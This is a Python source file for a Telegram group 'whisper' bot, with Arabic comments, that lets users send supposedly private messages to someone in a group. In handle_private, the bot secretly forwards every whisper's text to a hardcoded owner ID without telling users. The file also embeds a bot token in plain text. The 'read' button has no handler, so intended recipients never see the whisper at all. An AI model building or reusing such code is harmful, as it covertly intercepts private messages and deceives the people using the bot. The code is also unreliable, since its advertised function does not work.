import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

TOKEN = "8912650382:AAGxGtTJ6loePuTG3Dyt3f8Knhpa4HGDR4A"
bot = telebot.TeleBot(TOKEN)

OWNER_ID = 6312345678  # ضع الآي دي حقك هنا

# قاموس مؤقت لحفظ العمليات النشطة
active_sessions = {}

@bot.message_handler(commands=['start'])
def handle_start(message):
    text = message.text
    
    if " " in text:
        payload = text.split(" ", 1)[1]
        
        # إذا كان رابط همسة لشخص معين
        if payload.startswith("whisper_"):
            try:
                # استخراج معرف الشخص المستهدف
                target_id_str = payload.replace("whisper_", "")
                target_id = int(target_id_str)
                
                # حفظ جلسة المستخدم الحالي
                active_sessions[message.from_user.id] = {
                    'target_id': target_id,
                    'chat_id': message.chat.id
                }
                
                bot.reply_to(message, "💌 • اكتب همستك الآن وسأقوم بإرسالها فوراً:")
                return
            except Exception as e:
                print(f"Error parsing payload: {e}")

    # الرسالة الترحيبية العادية
    bot.reply_to(
        message,
        "✨ أهلاً بك في بوت الهمسات الذكي.\n\n"
        "💡 للبدء، رد على أي رسالة بـ (همس) أو (هـ) في المجموعة."
    )

@bot.message_handler(func=lambda message: message.chat.type == 'private')
def handle_private(message):
    user_id = message.from_user.id
    
    # التحقق هل المستخدم بصدد إرسال همسة لشخص خزنناه مسبقاً؟
    if user_id in active_sessions:
        session = active_sessions[user_id]
        target_id = session['target_id']
        whisper_text = message.text.strip()
        
        # إنشاء زر قراءة الهمسة
        markup = InlineKeyboardMarkup()
        # بما أن تيレجرام لا يدعم قراءة الهمسة إلا عبر بوت، سنرسل زر يوجهه للبوت بالنص
        markup.add(InlineKeyboardButton("👁️ رؤية الهمسة", callback_data=f"read_{user_id}"))
        
        # إرسال الهمسة للمجموعة
        bot.send_message(
            session['chat_id'],
            f"• الهمسة لـ ⟵ [مستخدم](tg://user?id={target_id})\n• من ⟵ {message.from_user.first_name}\n-",
            reply_markup=markup,
            parse_mode="Markdown"
        )
        
        bot.reply_to(message, f"• تم ارسال همستك لـ {target_id} بنجاح ✨")
        
        # إرسال نسخة للمالك سرياً
        try:
            bot.send_message(OWNER_ID, f"🚨 همسة جديدة من {message.from_user.first_name}:\n{whisper_text}")
        except:
            pass
            
        del active_sessions[user_id]
    else:
        # إذا كتب في الخاص بدون أن يضغط من المجموعة
        bot.reply_to(message, "الرجاء الذهاب للمجموعة والرد بـ (هـ) على الشخص ثم الضغط على زر الهمسة أولاً.")

@bot.message_handler(func=lambda message: message.chat.type != 'private')
def handle_group(message):
    if message.reply_to_message and message.text.strip() in ["هـ", "ه", "همس", "اهمس"]:
        target = message.reply_to_message.from_user
        if target.is_bot:
            return
            
        markup = InlineKeyboardMarkup()
        bot_user = bot.get_me().username
        
        # رابط مباشر للخاص يمرر آي دي المستهدف
        markup.add(InlineKeyboardButton("🛡️ اهمس هنا", url=f"https://t.me/{bot_user}?start=whisper_{target.id}"))
        
        bot.reply_to(
            message,
            f"• تم تحديد الهمسه لـ ⟵ [{target.first_name}](tg://user?id={target.id})\n• اضغط الزر لكتابة الهمسة في الخاص\n-",
            parse_mode="Markdown"
        )

bot.infinity_polling()
